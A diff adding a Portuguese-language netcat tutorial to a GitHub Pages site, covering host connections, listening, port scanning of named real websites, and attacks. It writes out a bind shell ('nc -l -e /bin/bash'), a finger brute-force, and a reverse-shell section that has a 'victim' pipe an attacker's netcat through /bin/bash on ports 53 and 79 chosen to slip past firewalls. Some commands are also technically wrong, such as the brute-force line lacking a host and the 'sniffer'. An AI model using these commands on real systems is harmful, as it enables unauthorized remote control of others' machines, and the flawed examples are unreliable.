@@ -100,6 +100,43 @@
 
       </p>
 
+
+
+
+
+
+
+
+
+
+<h3>
+
+         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
+            <span class="octicon octicon-link"></span></a>Obtendo o canivete-suíço
+
+      </h3>
+
+      <p>
+         
+         A maioria das distribuições Linux já vem com o netcat instalado, outras vem com ele pré-instalado. Caso sua distribuição ainda não tenha o netcat, você pode obtê-lo em <a href="www.securityfocus.com">www.securityfocus.com</a> e <a href="www.packetstormsecurity.net">www.packetstormsecurity.net</a>
+<br />
+<br />
+Para chamar o programa, basta o simples comando: 
+<br />
+<br />
+<b>$nc</b> 
+
+      </p>
+
+
+
+
+
+
+
+
+
+
       <h3>
 
          <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
@@ -130,6 +167,156 @@
          <br />
          <img src="img01.png" width="400">
       </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3>
+
+         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
+            <span class="octicon octicon-link"></span></a>Alguns experimentos
+
+      </h3>
+
+      <p>
+         
+         
+
+
+<h4>1) CONECTANDO-SE A UM HOST</h4>
+
+
+
+<p>É feita da mesma maneira que o telnet. É especificado apenas um host e a porta a se conectar. Exemplos: </p>
+
+<p><b>$nc mail.yahoo.com.br 110</b><br>
+<b>$nc www.terra.com.br 80</b> <br>
+
+
+<p>Lembrando que a porta 110 é dos servidores de POP3 e a 80 é para web. 
+</p>
+<h4>2) ABRINDO UMA PORTA (LISTENNING)</h4>
+
+
+<p>É utilizada a sintaxe -l para colocar em listenning e -vv para retornar eco com detalhes. A seguir é estipulada a porta: </p>
+
+</p><b>$nc -l -p 53 -vv </b></p>
+
+<p>Será retornada uma mensagem: </p>
+
+<p><b>"listenning on [any] 53 ... " </b></p>
+
+
+<h4>3) ESCANEANDO PORTAS COM O NETCAT</h4>
+
+
+<p>Será feita uma tentativa de conexão à um IP ou host e será estipulada as portas da tentativa de conexão: </p>
+
+<p><b>$nc -vv www.vivaolinux.com.br 110 80 139</b></p>
+<p><b>$nc -vv www.vivaolinux.com.br 1-10000 </b></p>
+
+<p>No primeiro exemplo serão escaneadas apenas as portas 110 (POP3), 80 (web) e 139 (compartilhamento do Windows). </p>
+
+<p>Já no segundo exemplo serão escaneadas desde a porta 1 até a 10000. </p>
+
+<h4>4) ABRINDO A PORTA, DANDO ENTRADA PARA UM "SHELL" (=TROJAN)</h4>
+
+
+<p>Será colocada a porta X em listenning, redirecionaremos a saída de dados para um shell (/bin/bash). Assim quando alguém se conectar a essa porta terá domínio total sobre o computador. Funciona de forma semelhante a um trojan.</p>
+
+<p><b>$nc -l -e /bin/bash -p 1033 </b></p>
+
+<h4>5) REALIZANDO UM BRUTE-FORCE</h4>
+
+<p><b>$nc -vv 79 < ~/wordlists.txt > bruteforce.log </b></p>
+
+<p>Perceba, que conectaremos a porta do FINGER(79) e redirecionaremos o conteúdo do arquivo wordlists.txt para essa porta. Quando algum resultado for válido ele será salvo em bruteforce.log para uma análise posterior dos resultados. </p>
+
+<h4>6) FAZENDO UM SNIFFER</h4>
+
+
+<p>Além de tudo isto demonstrado acima, o 'amazing' Netcat ainda pode capturar todo o tráfego de uma rede. Eu acho que você já sabe como fazer isso se observar os redirecionamentos utilizados no exemplo anterior. Mas vamos lá. </p>
+
+<p>Iremos nos conectar a uma porta e mandar o netcat "dar eco" nela, ou seja, exibir TUDO o que passa por ela. Após isso, é só redirecionar tudo o que o Netcat gravou para um arquivo. Veja a sintaxe, para melhor compreensão: </p>
+
+<p><b>$nc -vv -L 127.0.0.1 -p 80 > ~/sniffer.log </b></p>
+
+
+
+
+      </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3>
+
+         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
+            <span class="octicon octicon-link"></span></a>Fazendo uma conexão reversa com o NetCat
+
+      </h3>
+
+      <p>
+         
+         A conexão reversa é um método de invasão parecida com os trojans, porém ocorre de maneira contrária, ou seja, não será o invasor que se conectará ao host, mas o host se conectará ao invasor, concedendo-lhe poderes administrativos. O mais surpreendente é que utilizando a imaginação, podemos fazer isso com o Netcat.
+         <br>
+         <br>
+         Sabendo disso, vamos tomar um IP fictício de exemplo = 200.212.21.2. O que teremos que fazer é abrir uma porta em nosso computador local e fazer, executando um código arbitrário no computador da vítima, com que ela se conecte ao nosso computador e nos conceda poderes em sua máquina. Vamos no modo gráfico e abriremos duas janelas, abrindo as portas 53 e 79: 
+<br>
+<br>
+         <b>$nc -l -n -p 53 -vv</b><br>
+<b>$nc -l -n -p 79 -vv </b>
+
+
+
+
+
+<br>
+<br>
+
+
+<p>Após isso, faremos com que a vítima execute o seguinte código no computador dela: </p>
+
+<p><b>$nc < NOSSOIP > 53 | /bin/bash | nc < NOSSOIP > 79 </b></p>
+
+
+<p>Isso fará com que os comandos que nós dermos na porta 53, passem pelo shell bash e a resposta seja redirecionada na porta 79. </p>
+
+<p>Lembrando que as portas 53 e 79 foram utilizadas, pois o firewall deixa essas portas abrirem, pois são de consultas DNS e FINGER respectivamente. </p>
+      </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
 
       <footer class="site-footer">
       <span class="site-footer-owner"><a href="https://github.com/renanoaraujo/netcattool">Netcat Tool</a> is maintained by <a href="https://github.com/renanoaraujo">renanoaraujo</a>.</span>
